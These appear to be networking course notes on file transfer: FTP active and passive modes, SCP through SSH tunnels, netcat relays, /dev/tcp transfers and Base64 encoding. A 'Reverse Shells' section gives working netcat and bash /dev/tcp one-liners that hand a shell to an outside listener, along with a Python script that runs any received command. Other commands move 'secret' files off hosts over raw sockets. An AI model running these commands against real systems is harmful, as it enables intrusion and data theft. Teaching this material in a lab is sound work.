# STANDARD FILE TRANSFER METHODS

Describe common file transfer methods

Understand the use of Active and Passive FTP modes

Use SCP to transfer files


## COMMON METHODS FOR TRANSFERRING DATA

TFTP

FTP

    Active

    Passive

FTPS

SFTP

SCP

## TFTP 

RFC 1350 Rev2 (https://datatracker.ietf.org/doc/html/rfc1350)

UDP transport

Extremely small and very simple communication

No terminal communication

Insecure (no authentication or encryption)

No directory services

Used often for technologies such as BOOTP and PXE

## FTP
File Transfer Protocol

RFC 959

Uses 2 separate TCP connections

Control Connection (21) / Data Connection (20*)

Authentication in clear-text

Insecure in default configuration

Has directory services

Anonymous login

## FTP File Transfer Protocol

RFC 959 (https://tools.ietf.org/html/rfc959)

Uses 2 separate TCP connections

Control Connection (21) / Data Connection (20*)

Authentication in clear-text

Insecure in default configuration

Has directory services

Anonymous login

### FTP ACTIVE 
![ftp_active](https://github.com/user-attachments/assets/533d5bf1-ea7b-4b30-b102-a9c35b0c7296)

Pizza is delievered to you
### FTP ACTIVE FOR ANONYMOUS
```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
```
### FTP ACTIVE FOR USER
```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```
### FTP PASSIVE
![ftp_passive](https://github.com/user-attachments/assets/4a499e30-1d47-4ad4-abab-1eef105ff33f)

Pizza is picked up by you

### FTP PASSIVE WITH WGET

```
student@blue-internet-host:~$ proxychains wget -r ftp://10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
--2024-05-03 15:09:01--  ftp://10.0.0.104/
           => ‘10.0.0.104/.listing’
Connecting to 10.0.0.104:21... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:32857-<><>-OK
done.    ==> LIST ... done.

{output omitted}

FINISHED --2024-05-03 15:09:01--
Total wall clock time: 0.03s
Downloaded: 3 files, 8.4K in 0s (23.5 MB/s)
```

### FTP PASSIVE FOR ANONYMOUS
```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 17:20:09 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,162,147).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:41619-<><>-OK
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>
```

### FTP PASSIVE FOR USER
```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command
ftp: bind: Address already in use
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,168,167).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:43175-<><>-OK
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```

## FTPS File Transfer Protocol Secure

Adds SSL/TLS encryption to FTP

Interactive terminal access

Explicit Mode: ports 20/21*

	Option for Encryption

Implicit Mode: ports 989/990*

	Encrytion assumed

 ## SFTP Secure File Transfer Protocol

TCP transport (port 22)

Uses symmetric and asymmetric encryption

Adds FTP like services to SSH

Authentication through sign in (username and password) or with SSH key

Interactive terminal access


# SCP Secure Copy Protocol

TCP Transport (port 22)

Uses symmetric and asymmetric encryption

Authentication through sign in (username and password) or with SSH key

Non-Interactive

## SCP OPTIONS
.  - Present working directory

-v - verbose mode

-P - alternate port

-r - recursively copy an entire directory

-3 - 3-way copy

## SCP Syntax
Download a file from a remote directory to a local directory

	$ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory
	
	$ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host

	$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
	password:    password:
Recursive upload of a folder to remote

	$ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote

	$ scp -r student@172.16.82.106:folder/ .

## SCP SYNTAX W/ ALTERNATE SSHD

Download a file from a remote directory to a local directory

	$ scp -P 1111 student@172.16.82.106:secretstuff.txt .

Upload a file to a remote directory from a local directory

	$ scp -P 1111 secretstuff.txt student@172.16.82.106:

## SCP SYNTAX THROUGH A TUNNEL

Create a local port forward to target device

	$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Download a file from a remote directory to a local directory

	$ scp -P 1111 student@localhost:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

	$ scp -P 1111 secretstuff.txt student@localhost:/home/student
## SCP SYNTAX THROUGH A DYNAMIC PORT FORWARD
Create a Dynamic Port Forward to target device

	$ ssh student@172.16.82.106 -D 9050 -NT

Download a file from a remote directory to a local directory

	$ proxychains scp student@localhost:secretstuff.txt .

Upload a file to a remote directory from a local directory
	
 	$ proxychains scp secretstuff.txt student@localhost:

# CONDUCT UNCOMMON METHODS OF FILE TRANSFER
Demonstrate the use of Netcat for data transfer

Perform traffic redirection using Netcat relays

Discuss the use of named and unnamed pipes

Conduct file transfers using /dev/tcp

## NETCAT
NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.

Can be used for the following:

inbound and outbound connections, TCP/UDP, to or from any port

troubleshooting network connections

sending/receiving data (insecurely)

port scanning (similar to -sT in Nmap)

## NETCAT: CLIENT TO LISTENER FILE TRANSFER
Listener (receive file):

nc -lvp 9001 > newfile.txt
Client (sends file):

nc 172.16.82.106 9001 < file.txt

## NETCAT: LISTENER TO CLIENT FILE TRANSFER
Listener (sends file):

	nc -lvp 9001 < file.txt

Client (receive file):

	nc 172.16.82.106 9001 > newfile.txt

##  NETCAT RELAY DEMOS
### Listener - Listener

On Blue_Host-1 Relay:

	$ mknod mypipe p
	$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
On Internet_Host (send):

	$ nc 172.16.82.106 1111 < secret.txt

On Blue_Priv_Host-1 (receive):

	$ nc 192.168.1.1 3333 > newsecret.txt
 ### Client - Client

On Internet_Host (send):

	$ nc -lvp 1111 < secret.txt
 
On Blue_Priv_Host-1 (receive):

	$ nc -lvp 3333 > newsecret.txt

On Blue_Host-1 Relay:

	$ mknod mypipe p
	$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

###  NETCAT Relay Demos
Client - Listener

On Internet_Host (send):

	$ nc -lvp 1111 < secret.txt

On Blue_Priv_Host-1 (receive):

	$ nc 192.168.1.1 3333 > newsecret.txt

On Blue_Host-1 Relay:

	$ mknod mypipe p
	$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe

###  Listener - Client

On Internet_Host (send):

	$ nc 172.16.82.106 1111 < secret.txt

On Blue_Priv_Host-1 (receive):

	$ nc -lvp 3333 > newsecret.txt

On Blue_Host-1 Relay:

	$ mknod mypipe p
	$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

##  FILE TRANSFER WITH /DEV/TCP
On the receiving box:

	$ nc -lvp 1111 > devtcpfile.txt

On the sending box:

	$ cat secret.txt > /dev/tcp/10.10.0.40/1111

This method is useful for a host that does not have NETCAT available.


# REVERSE SHELLS

## REVERSE SHELL USING NETCAT
First listen for the shell on your device.

	$ nc -lvp 9999

On Victim using -c :

	$ nc -c /bin/bash 10.10.0.40 9999

On Victim using -e :

	$ nc -e /bin/bash 10.10.0.40 9999

## REVERSE SHELL USING /DEV/TCP
First listen for the shell on your device.

	$ nc -lvp 9999

On Victim:

	$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1

## REVERSE SHELL PYTHON3

```
#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()
 ```
 
# UNDERSTANDING PACKING AND ENCODING
Discuss the purpose of packers

Perform Hexadecimal encoding and decoding

Demonstrate Base64 encoding and decoding

Conduct file transfers with Base64

## PACKERS
Compress executeables

Special code added to programs to compress executables

Reduces network traffic

Used for obfuscation

Reduces time on target

Example: UPX

## ENCODING AND DECODING


Specialized formatting

Used for transmission and storage

Hex and Base64 are the most common

NOT Compression!!

NOT Encapsulation!!

NOT Encryption!!

## HEXADECIMAL ENCODING AND DECODING
Converts the binary representation of a data set to the 2 digit base-16 equivalent.

Used by IPv6 and MAC addresses

Color schemes

Increases readability and information density

## XXD EXAMPLE
echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\

	$ echo "Hex encoding test" | xxd -p 48657820656e636f64696e6720746573740a

echo hex string and use xxd to restore the data to its original format

	$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p Hex encoding test

 ## BASE64 ENCODING AND DECODING
binary-to-text encoding

A-Z, a-z, 1-9, +, /

6 bits per non-final digit

(4) 6-bit groups per (3) 8-bit groups

padding used to fill in any unused space in each 24-bit group

## BASE64 CONVERSION CHART

![base64chart](https://github.com/user-attachments/assets/142ee284-e1c0-45fd-a262-a78924551732)

## ASCII TO BASE64 CONVERSION EXAMPLE
￼
![asciitobase64conversion](https://github.com/user-attachments/assets/68dac678-80ef-4d7d-8496-6fb4485e1f36)

## TRANSFER FILE WITH BASE64
generate the base64 output of a file, with line wrapping removed

	$ base64 -w0 logoCyber.png
 
copy the output

create a new file on your machine

	$ nano b64image.png

	paste, save & exit
decode from base64 with -d

	$ base64 -d b64image.png > logoCyber.png
 
